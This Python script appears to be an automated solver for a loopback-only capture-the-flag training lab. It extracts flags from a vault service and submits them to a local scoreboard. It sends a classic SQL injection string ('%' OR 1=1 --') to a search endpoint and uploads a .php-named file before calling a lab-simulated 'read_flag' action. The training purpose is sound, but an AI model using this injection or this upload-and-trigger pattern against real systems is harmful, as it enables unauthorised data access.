#!/usr/bin/env python3
"""Solve and submit flags for the loopback-only FCTF Vault training lab.

This runner has no target URL or submit URL setting. It always connects to
127.0.0.1 and uses the lab's fixed routes. It does not follow redirects or use
environment-configured HTTP proxies. The uploaded PHP-looking file is inert:
the lab stores it as bytes and only simulates the read_flag action.
"""

from __future__ import annotations

import argparse
import http.client
import json
import re
import sys
from urllib.parse import urlencode

MAX_RESPONSE = 1024 * 1024
FLAG_RE = re.compile(r"FCTF\{[A-Za-z0-9_-]+\}")


class LabError(Exception):
    """A response did not match the local training lab protocol."""


def request(port: int, method: str, path: str, body: bytes | None = None,
            content_type: str | None = None) -> tuple[int, dict]:
    headers = {"Accept": "application/json", "Connection": "close"}
    if content_type:
        headers["Content-Type"] = content_type

    # Deliberately use a literal loopback address and fixed paths. HTTPConnection
    # does not follow redirects and does not honor HTTP(S)_PROXY environment vars.
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    try:
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        raw = response.read(MAX_RESPONSE + 1)
        if len(raw) > MAX_RESPONSE:
            raise LabError("response exceeded 1 MiB")
        try:
            payload = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise LabError("server did not return JSON") from exc
        if not isinstance(payload, dict):
            raise LabError("server returned an unexpected JSON value")
        return response.status, payload
    finally:
        conn.close()


def find_flag(value: object) -> str:
    raw = json.dumps(value, ensure_ascii=False)
    match = FLAG_RE.search(raw)
    if not match:
        raise LabError("no FCTF flag was present in the response")
    return match.group(0)


def submit(port: int, challenge: str, flag: str) -> bool:
    body = json.dumps({
        "teamId": 1,
        "targetTeamId": 2,
        "challengeId": challenge,
        "flag": flag,
    }).encode("utf-8")
    status, result = request(
        port, "POST", "/api/submit", body,
        "application/json; charset=utf-8",
    )
    if status >= 300 or result.get("accepted") is not True:
        print(f"  [-] {challenge}: scoreboard rejected the flag ({result.get('reason', 'HTTP ' + str(status))})")
        return False
    points = int(result.get("points", 0) or 0)
    note = "duplicate; +0" if result.get("duplicate") else f"accepted; +{points}"
    print(f"  [+] {challenge}: {note} points")
    return True


def solve_sqli(port: int) -> bool:
    # This intentionally vulnerable endpoint exists only in the local FCTF lab.
    query = "%\' OR 1=1 --"
    path = "/lab/team/2/sqli/search?" + urlencode({"q": query})
    status, result = request(port, "GET", path)
    if status >= 300:
        raise LabError(f"SQLi lab endpoint returned HTTP {status}")
    flag = find_flag(result)
    print(f"[*] SQLi challenge flag: {flag}")
    return submit(port, "sqli", flag)


def solve_upload(port: int) -> bool:
    boundary = "----FCTFLocalTrainingBoundary"
    filename = "fctf-proof.php"
    # The challenge stores these bytes; it never interprets or executes them.
    inert_file = b"<?php /* inert training artifact; no commands */ ?>"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode("ascii") + inert_file + f"\r\n--{boundary}--\r\n".encode("ascii")

    status, uploaded = request(
        port, "POST", "/lab/team/2/upload", body,
        f"multipart/form-data; boundary={boundary}",
    )
    if status >= 300 or uploaded.get("uploaded") is not True:
        raise LabError(f"local upload challenge returned HTTP {status}")

    action = urlencode({"filename": uploaded.get("filename", filename),
                        "action": "read_flag"})
    status, result = request(
        port, "GET", "/lab/team/2/upload/run?" + action,
    )
    if status >= 300:
        raise LabError(f"simulated upload action returned HTTP {status}")
    flag = find_flag(result)
    print(f"[*] Upload challenge flag: {flag} (simulated; file was not executed)")
    return submit(port, "upload", flag)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Solve the loopback-only FCTF SQLi and inert-upload lab."
    )
    parser.add_argument("--port", type=int, choices=(8000, 8001), default=8000,
                        help="local FCTF server port: 8000 or 8001 (default: 8000)")
    args = parser.parse_args()

    try:
        status, health = request(args.port, "GET", "/lab/team/2/health")
        if (status != 200 or health.get("team") != 2
                or health.get("service") != "Vault Service"):
            raise LabError("the local service did not identify as the FCTF Vault lab")
    except (OSError, LabError) as exc:
        print(f"[!] Cannot reach the FCTF lab at 127.0.0.1:{args.port}: {exc}",
              file=sys.stderr)
        return 2

    print(f"FCTF local lab runner → Team 2 at 127.0.0.1:{args.port}")
    print("Only fixed loopback routes are used; no external target or submit URL is accepted.")
    accepted = 0
    for name, solve in (("sqli", solve_sqli), ("upload", solve_upload)):
        try:
            accepted += int(solve(args.port))
        except (OSError, LabError, ValueError, KeyError) as exc:
            print(f"  [-] {name}: {exc}", file=sys.stderr)
    print(f"Done: {accepted}/2 flags accepted by the local scoreboard.")
    return 0 if accepted == 2 else 1


if __name__ == "__main__":
    raise SystemExit(main())
